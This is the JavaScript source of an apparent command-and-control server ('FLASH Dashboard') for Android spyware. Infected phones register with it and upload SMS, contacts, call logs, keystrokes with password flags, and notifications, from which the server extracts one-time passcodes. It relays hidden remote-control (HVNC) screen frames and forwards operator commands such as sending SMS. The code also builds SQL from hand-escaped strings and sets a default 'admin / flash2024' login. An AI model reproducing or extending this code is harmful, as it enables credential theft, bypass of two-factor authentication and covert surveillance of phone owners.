'use strict';

require('dotenv').config();
const http = require('http');
const express = require('express');
const { WebSocketServer, WebSocket } = require('ws');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cookieParser = require('cookie-parser');
const path = require('path');
const crypto = require('crypto');

// ─── Config ──────────────────────────────────────────────────────────────────
const PORT       = process.env.PORT       || 3000;
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(32).toString('hex');
const JWT_TTL    = '12h';

// ─── Database ─────────────────────────────────────────────────────────────────
const db = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : false,
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

db.on('error', err => console.error('[DB] pool error', err.message));

async function dbInit() {
  const fs = require('fs');
  const sql = fs.readFileSync(path.join(__dirname, 'schema.sql'), 'utf8');
  await db.query(sql);

  // Create default admin if no operators exist
  const { rowCount } = await db.query('SELECT 1 FROM operators LIMIT 1');
  if (rowCount === 0) {
    const hash = await bcrypt.hash(process.env.ADMIN_PASSWORD || 'flash2024', 12);
    await db.query(
      'INSERT INTO operators (username, password_hash) VALUES ($1, $2) ON CONFLICT DO NOTHING',
      [process.env.ADMIN_USER || 'admin', hash]
    );
    console.log('[INIT] Default admin created → admin / flash2024');
  }
}

// ─── App & Middleware ─────────────────────────────────────────────────────────
const app = express();
app.use(express.json({ limit: '10mb' }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// ─── Auth Middleware ──────────────────────────────────────────────────────────
function requireAuth(req, res, next) {
  const token = req.cookies?.token || req.headers.authorization?.replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  try {
    req.operator = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}

function verifyWsToken(token) {
  try { return jwt.verify(token, JWT_SECRET); } catch { return null; }
}

// ─── In-Memory Device & Operator Registry ────────────────────────────────────
// devices:   Map<deviceId, { ws, info, watchers: Set<operatorId> }>
// operators: Map<operatorId, { ws, watching: deviceId|null }>
const devices   = new Map();
const operators = new Map();

function broadcastDeviceList() {
  const list = [...devices.entries()].map(([id, d]) => ({
    id,
    alias:          d.info.alias || d.info.model || id,
    model:          d.info.model,
    androidVersion: d.info.androidVersion,
    manufacturer:   d.info.manufacturer,
    phoneNumber:    d.info.phoneNumber,
    batteryLevel:   d.info.batteryLevel,
    isRooted:       d.info.isRooted,
    carrier:        d.info.carrier,
    country:        d.info.country,
    online:         d.ws.readyState === WebSocket.OPEN,
    watchers:       d.watchers.size,
  }));

  const msg = JSON.stringify({ type: 'device_list', devices: list });
  for (const [, op] of operators) {
    if (op.ws.readyState === WebSocket.OPEN) op.ws.send(msg);
  }
}

function sendToDevice(deviceId, payload) {
  const dev = devices.get(deviceId);
  if (!dev || dev.ws.readyState !== WebSocket.OPEN) return false;
  const data = typeof payload === 'string' ? payload : JSON.stringify(payload);
  dev.ws.send(data);
  return true;
}

function relayToWatchers(deviceId, msg, isBinary = false) {
  const dev = devices.get(deviceId);
  if (!dev) return;
  for (const opId of dev.watchers) {
    const op = operators.get(opId);
    if (op?.ws.readyState === WebSocket.OPEN) {
      op.ws.send(msg, { binary: isBinary });
    }
  }
}

// ─── REST Auth Endpoints ──────────────────────────────────────────────────────
app.post('/auth/login', async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'Missing credentials' });

  try {
    const { rows } = await db.query('SELECT * FROM operators WHERE username = $1', [username]);
    if (!rows.length) return res.status(401).json({ error: 'Invalid credentials' });

    const ok = await bcrypt.compare(password, rows[0].password_hash);
    if (!ok) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign({ id: rows[0].id, username: rows[0].username }, JWT_SECRET, { expiresIn: JWT_TTL });
    res
      .cookie('token', token, { httpOnly: true, sameSite: 'strict', maxAge: 43200000 })
      .json({ ok: true, token, username: rows[0].username });
  } catch (err) {
    console.error('[AUTH] login error:', err.message);
    res.status(500).json({ error: 'Internal error' });
  }
});

app.post('/auth/logout', (req, res) => {
  res.clearCookie('token').json({ ok: true });
});

app.get('/auth/me', requireAuth, (req, res) => {
  res.json({ username: req.operator.username });
});

// ─── REST API ─────────────────────────────────────────────────────────────────
app.get('/api/devices', requireAuth, async (req, res) => {
  try {
    const { rows } = await db.query('SELECT * FROM devices ORDER BY last_seen DESC');
    // Merge live online status
    const list = rows.map(r => ({ ...r, online: devices.has(r.id) && devices.get(r.id).ws.readyState === WebSocket.OPEN }));
    res.json(list);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id', requireAuth, async (req, res) => {
  try {
    const { rows } = await db.query('SELECT * FROM devices WHERE id = $1', [req.params.id]);
    if (!rows.length) return res.status(404).json({ error: 'Not found' });
    const dev = rows[0];
    dev.online = devices.has(dev.id) && devices.get(dev.id).ws.readyState === WebSocket.OPEN;
    res.json(dev);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/sms', requireAuth, async (req, res) => {
  try {
    const limit  = Math.min(parseInt(req.query.limit)  || 100, 500);
    const offset = parseInt(req.query.offset) || 0;
    const { rows } = await db.query(
      'SELECT * FROM sms WHERE device_id = $1 ORDER BY date DESC NULLS LAST LIMIT $2 OFFSET $3',
      [req.params.id, limit, offset]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/contacts', requireAuth, async (req, res) => {
  try {
    const { rows } = await db.query(
      'SELECT * FROM contacts WHERE device_id = $1 ORDER BY name',
      [req.params.id]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/calls', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    const { rows } = await db.query(
      'SELECT * FROM calls WHERE device_id = $1 ORDER BY date DESC NULLS LAST LIMIT $2',
      [req.params.id, limit]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/keylogs', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
    const { rows } = await db.query(
      'SELECT * FROM keylogs WHERE device_id = $1 ORDER BY received_at DESC LIMIT $2',
      [req.params.id, limit]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

app.get('/api/device/:id/notifications', requireAuth, async (req, res) => {
  try {
    const limit = Math.min(parseInt(req.query.limit) || 100, 500);
    const { rows } = await db.query(
      'SELECT * FROM notifications WHERE device_id = $1 ORDER BY post_time DESC NULLS LAST LIMIT $2',
      [req.params.id, limit]
    );
    res.json(rows);
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// Send SMS via REST (queues command to device)
app.post('/api/device/:id/send-sms', requireAuth, async (req, res) => {
  const { to, body } = req.body;
  if (!to || !body) return res.status(400).json({ error: 'Missing to or body' });
  const sent = sendToDevice(req.params.id, { action: 'SEND_SMS', phoneNo: to, smsText: body });
  res.json({ ok: sent, queued: !sent });
});

// Command shortcut REST endpoints
app.post('/api/device/:id/command', requireAuth, async (req, res) => {
  const sent = sendToDevice(req.params.id, req.body);
  res.json({ ok: sent });
});

// Update device alias
app.patch('/api/device/:id/alias', requireAuth, async (req, res) => {
  const { alias } = req.body;
  if (!alias) return res.status(400).json({ error: 'Missing alias' });
  try {
    await db.query('UPDATE devices SET alias = $1 WHERE id = $2', [alias, req.params.id]);
    // Notify all operators
    const dev = devices.get(req.params.id);
    if (dev) dev.info.alias = alias;
    broadcastDeviceList();
    res.json({ ok: true });
  } catch (err) { res.status(500).json({ error: err.message }); }
});

// ─── HTTP Server ──────────────────────────────────────────────────────────────
const server = http.createServer(app);

// ─── WebSocket Servers ────────────────────────────────────────────────────────
// Two separate WS servers sharing the same HTTP server via URL path routing.
//
// perMessageDeflate: false  — JPEG frames are already compressed; deflating them
//   burns CPU on both ends for zero byte savings and adds ~2-5ms latency per frame.
//   Critical for smooth HVNC. JSON control messages are tiny and don't need it either.
//
// maxPayload: 4MB           — headroom for high-res JPEG frames from modern devices.
const WS_OPTS = { noServer: true, perMessageDeflate: false, maxPayload: 4 * 1024 * 1024 };
const deviceWss    = new WebSocketServer(WS_OPTS);
const dashboardWss = new WebSocketServer(WS_OPTS);

server.on('upgrade', (req, socket, head) => {
  const url = req.url?.split('?')[0];

  if (url === '/ws/device') {
    deviceWss.handleUpgrade(req, socket, head, ws => deviceWss.emit('connection', ws, req));
  } else if (url === '/ws/dashboard') {
    dashboardWss.handleUpgrade(req, socket, head, ws => dashboardWss.emit('connection', ws, req));
  } else {
    socket.destroy();
  }
});

// ─── Device WebSocket Handler ─────────────────────────────────────────────────
deviceWss.on('connection', (ws, req) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
           || req.socket.remoteAddress;

  let deviceId = null;

  ws.on('message', async (data, isBinary) => {
    // Binary → HVNC frame: [0x01][uint32 BE size][JPEG bytes]
    if (isBinary || Buffer.isBuffer(data)) {
      const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
      if (buf[0] === 0x01 && buf.length >= 5) {
        // Frame is valid — relay raw buffer to watching operators
        if (deviceId) relayToWatchers(deviceId, buf, true);
      }
      return;
    }

    // Text → JSON command/event
    let msg;
    try { msg = JSON.parse(data); } catch { return; }

    // ── Device registration ──────────────────────────────────────────────────
    if (msg.type === 'register' || msg.action === 'REGISTER' ||
        (msg.type === 'DEVICE_INFO' && !deviceId)) {
      deviceId = msg.deviceId || msg.device_id || msg.id || crypto.randomUUID();

      const info = {
        alias:          null,
        model:          msg.model          || msg.deviceModel      || null,
        androidVersion: msg.androidVersion || msg.android_version  || null,
        manufacturer:   msg.manufacturer                           || null,
        phoneNumber:    msg.phoneNumber    || msg.phone_number      || null,
        batteryLevel:   msg.batteryLevel   || msg.battery_level  || null,
        isRooted:       !!msg.isRooted,
        carrier:        msg.carrier        || msg.sim_operator     || null,
        country:        msg.country                                || null,
        wifiSsid:       msg.wifiSsid       || msg.wifi_ssid         || null,
        permissions:    msg.permissions                            || {},
        ip,
      };

      // Check DB for existing alias
      try {
        const existing = await db.query('SELECT alias FROM devices WHERE id = $1', [deviceId]);
        if (existing.rows.length) info.alias = existing.rows[0].alias;
      } catch {}

      devices.set(deviceId, { ws, info, watchers: new Set() });

      // Upsert device in DB
      db.query(`
        INSERT INTO devices (id, model, android_version, manufacturer, phone_number,
          battery_level, is_rooted, carrier, country, wifi_ssid, permissions, ip_address, is_online, last_seen)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,TRUE,NOW())
        ON CONFLICT (id) DO UPDATE SET
          model = EXCLUDED.model, android_version = EXCLUDED.android_version,
          manufacturer = EXCLUDED.manufacturer, phone_number = EXCLUDED.phone_number,
          battery_level = EXCLUDED.battery_level, is_rooted = EXCLUDED.is_rooted,
          carrier = EXCLUDED.carrier, country = EXCLUDED.country,
          wifi_ssid = EXCLUDED.wifi_ssid, permissions = EXCLUDED.permissions,
          ip_address = EXCLUDED.ip_address, is_online = TRUE, last_seen = NOW()
      `, [deviceId, info.model, info.androidVersion, info.manufacturer, info.phoneNumber,
          info.batteryLevel, info.isRooted, info.carrier, info.country, info.wifiSsid,
          JSON.stringify(info.permissions), ip]).catch(console.error);

      // Send ack
      ws.send(JSON.stringify({ type: 'registered', deviceId }));
      broadcastDeviceList();
      console.log(`[DEVICE] +++ ${deviceId} (${info.model || 'unknown'}) from ${ip}`);
      return;
    }

    if (!deviceId) return; // ignore unregistered

    // Update last_seen
    db.query('UPDATE devices SET last_seen = NOW() WHERE id = $1', [deviceId]).catch(() => {});

    // ── Data events from device ──────────────────────────────────────────────
    const type = msg.type || msg.event;

    switch (type) {

      case 'sms':
      case 'SMS': {
        const list = msg.smsList || msg.data || [];
        if (!list.length) break;
        const vals = list.map(s =>
          `('${deviceId}','${esc(s.id||s.sms_id)}','${esc(s.address)}',$$${esc(s.body)}$$,${s.date||null},${s.type||0},${s.read||s.is_read||false})`
        ).join(',');
        db.query(`INSERT INTO sms (device_id,sms_id,address,body,date,type,is_read) VALUES ${vals} ON CONFLICT DO NOTHING`).catch(console.error);
        break;
      }

      case 'contacts': {
        const list = msg.contactsList || msg.data || [];
        if (!list.length) break;
        const vals = list.map(c =>
          `('${deviceId}','${esc(c.id||c.contact_id)}','${esc(c.name)}','${esc(c.phoneNumber||c.phone)}','${esc(c.email||'')}')`
        ).join(',');
        db.query(`INSERT INTO contacts (device_id,contact_id,name,phone,email) VALUES ${vals} ON CONFLICT DO NOTHING`).catch(console.error);
        break;
      }

      case 'calls': {
        const list = msg.callsList || msg.data || [];
        if (!list.length) break;
        const vals = list.map(c =>
          `('${deviceId}','${esc(c.id||c.call_id)}','${esc(c.number||c.phoneNo||'')}','${esc(c.name||'')}',${c.duration||0},${c.date||null},${c.type||0})`
        ).join(',');
        db.query(`INSERT INTO calls (device_id,call_id,number,name,duration,date,type) VALUES ${vals} ON CONFLICT DO NOTHING`).catch(console.error);
        break;
      }

      case 'keylog': {
        const entries = Array.isArray(msg.data) ? msg.data : [msg];
        for (const e of entries) {
          db.query(
            'INSERT INTO keylogs (device_id,app_name,package_name,text,is_password,timestamp) VALUES ($1,$2,$3,$4,$5,$6)',
            [deviceId, e.appName||e.app_name||null, e.packageName||e.package_name||null,
             e.text||e.key||null, !!(e.isPassword||e.is_password), e.timestamp||Date.now()]
          ).catch(console.error);
        }
        break;
      }

      case 'notification': {
        const n = msg.data || msg;
        const otp = extractOtp(n.body || n.text || '');
        db.query(
          'INSERT INTO notifications (device_id,package_name,title,body,is_otp,otp_code,post_time) VALUES ($1,$2,$3,$4,$5,$6,$7)',
          [deviceId, n.packageName||n.package_name||null, n.title||null, n.body||n.text||null,
           !!otp, otp, n.postTime||n.post_time||Date.now()]
        ).catch(console.error);
        break;
      }

      case 'DEVICE_INFO':
      case 'device_info': {
        const info = msg.data || msg;
        db.query(`UPDATE devices SET battery_level=$1, wifi_ssid=$2, carrier=$3, is_online=TRUE, last_seen=NOW() WHERE id=$4`,
          [info.batteryLevel||info.battery_level||null, info.wifiSsid||info.wifi_ssid||null,
           info.carrier||null, deviceId]).catch(console.error);
        const dev = devices.get(deviceId);
        if (dev) {
          if (info.batteryLevel != null) dev.info.batteryLevel = info.batteryLevel;
          if (info.carrier) dev.info.carrier = info.carrier;
        }
        broadcastDeviceList();
        break;
      }
    }

    // Always relay JSON events to watching operators
    relayToWatchers(deviceId, JSON.stringify({ ...msg, _deviceId: deviceId }));
  });

  ws.on('close', () => {
    if (!deviceId) return;
    const dev = devices.get(deviceId);
    if (dev) {
      // Notify watchers
      for (const opId of dev.watchers) {
        const op = operators.get(opId);
        if (op?.ws.readyState === WebSocket.OPEN) {
          op.ws.send(JSON.stringify({ type: 'device_offline', deviceId }));
        }
      }
    }
    devices.delete(deviceId);
    db.query('UPDATE devices SET is_online=FALSE WHERE id=$1', [deviceId]).catch(() => {});
    broadcastDeviceList();
    console.log(`[DEVICE] --- ${deviceId}`);
  });

  ws.on('error', err => console.error(`[DEVICE] ${deviceId} error:`, err.message));
});

// ─── Dashboard WebSocket Handler ──────────────────────────────────────────────
dashboardWss.on('connection', (ws, req) => {
  // Extract token from query string or cookie header
  const urlParams = new URLSearchParams(req.url?.split('?')[1] || '');
  const rawCookie = req.headers.cookie || '';
  const cookieToken = rawCookie.match(/(?:^|;\s*)token=([^;]+)/)?.[1];
  const token = urlParams.get('token') || cookieToken;

  const operator = verifyWsToken(token);
  if (!operator) {
    ws.send(JSON.stringify({ type: 'error', message: 'Unauthorized' }));
    ws.close(1008, 'Unauthorized');
    return;
  }

  const opId = `op_${operator.id}_${Date.now()}`;
  operators.set(opId, { ws, watching: null, username: operator.username });
  console.log(`[OP] +++ ${operator.username} (${opId})`);

  // Send current device list immediately
  const list = [...devices.entries()].map(([id, d]) => ({
    id,
    alias:          d.info.alias || d.info.model || id,
    model:          d.info.model,
    androidVersion: d.info.androidVersion,
    manufacturer:   d.info.manufacturer,
    phoneNumber:    d.info.phoneNumber,
    batteryLevel:   d.info.batteryLevel,
    isRooted:       d.info.isRooted,
    carrier:        d.info.carrier,
    country:        d.info.country,
    online:         d.ws.readyState === WebSocket.OPEN,
    watchers:       d.watchers.size,
  }));
  ws.send(JSON.stringify({ type: 'device_list', devices: list }));

  ws.on('message', data => {
    let msg;
    try { msg = JSON.parse(data); } catch { return; }

    const op = operators.get(opId);

    switch (msg.type) {

      case 'watch': {
        // Start watching a device
        const targetId = msg.deviceId;
        // Unwatch previous
        if (op.watching && op.watching !== targetId) {
          devices.get(op.watching)?.watchers.delete(opId);
        }
        const dev = devices.get(targetId);
        if (!dev) {
          ws.send(JSON.stringify({ type: 'error', message: 'Device not found or offline' }));
          break;
        }
        op.watching = targetId;
        dev.watchers.add(opId);
        ws.send(JSON.stringify({ type: 'watching', deviceId: targetId }));
        broadcastDeviceList();
        break;
      }

      case 'unwatch': {
        if (op.watching) {
          devices.get(op.watching)?.watchers.delete(opId);
          op.watching = null;
          broadcastDeviceList();
        }
        break;
      }

      case 'command': {
        // Forward command to target device
        const targetId = msg.deviceId || op.watching;
        if (!targetId) {
          ws.send(JSON.stringify({ type: 'error', message: 'No device targeted' }));
          break;
        }
        const { type: _, deviceId: __, ...cmdPayload } = msg;
        const sent = sendToDevice(targetId, cmdPayload);
        ws.send(JSON.stringify({ type: 'command_ack', sent, cmd: cmdPayload.action || cmdPayload.cmd }));
        break;
      }

      case 'ping':
        ws.send(JSON.stringify({ type: 'pong', t: Date.now() }));
        break;
    }
  });

  ws.on('close', () => {
    const op = operators.get(opId);
    if (op?.watching) {
      devices.get(op.watching)?.watchers.delete(opId);
    }
    operators.delete(opId);
    broadcastDeviceList();
    console.log(`[OP] --- ${operator.username}`);
  });

  ws.on('error', err => console.error(`[OP] ${opId} error:`, err.message));
});

// ─── Helpers ──────────────────────────────────────────────────────────────────
function esc(str) {
  if (str == null) return '';
  return String(str).replace(/'/g, "''");
}

function extractOtp(text) {
  const m = text.match(/\b(\d{4,8})\b/);
  return m ? m[1] : null;
}

// ─── Native WS ping/pong heartbeat ───────────────────────────────────────────
// Uses the WebSocket protocol-level ping frame (not JSON), which the OS TCP
// stack acknowledges without waking app-level code on the device.
// Runs every 10s — fast enough to detect dead sockets within one VNC session.

function markAlive(ws) { ws._alive = true; }

deviceWss.on('connection', ws => {
  ws._alive = true;
  ws.on('pong', () => { ws._alive = true; });
});

dashboardWss.on('connection', ws => {
  ws._alive = true;
  ws.on('pong', () => { ws._alive = true; });
});

setInterval(() => {
  // Prune dead device sockets
  for (const [id, dev] of devices) {
    if (dev.ws._alive === false) {
      dev.ws.terminate();
      devices.delete(id);
      db.query('UPDATE devices SET is_online=FALSE WHERE id=$1', [id]).catch(() => {});
      broadcastDeviceList();
      continue;
    }
    dev.ws._alive = false;
    if (dev.ws.readyState === WebSocket.OPEN) dev.ws.ping();
  }
  // Prune dead operator sockets
  for (const [id, op] of operators) {
    if (op.ws._alive === false) {
      op.ws.terminate();
      operators.delete(id);
      continue;
    }
    op.ws._alive = false;
    if (op.ws.readyState === WebSocket.OPEN) op.ws.ping();
  }
}, 10000);

// ─── Start ────────────────────────────────────────────────────────────────────
dbInit()
  .then(() => {
    server.listen(PORT, () => {
      console.log(`\n╔══════════════════════════════════════╗`);
      console.log(`║   FLASH Dashboard  →  :${PORT}         ║`);
      console.log(`╚══════════════════════════════════════╝\n`);
      console.log(`  Device WS   ws://host:${PORT}/ws/device`);
      console.log(`  Operator WS ws://host:${PORT}/ws/dashboard`);
      console.log(`  Dashboard   http://host:${PORT}\n`);
    });
  })
  .catch(err => {
    console.error('[FATAL] DB init failed:', err.message);
    process.exit(1);
  });
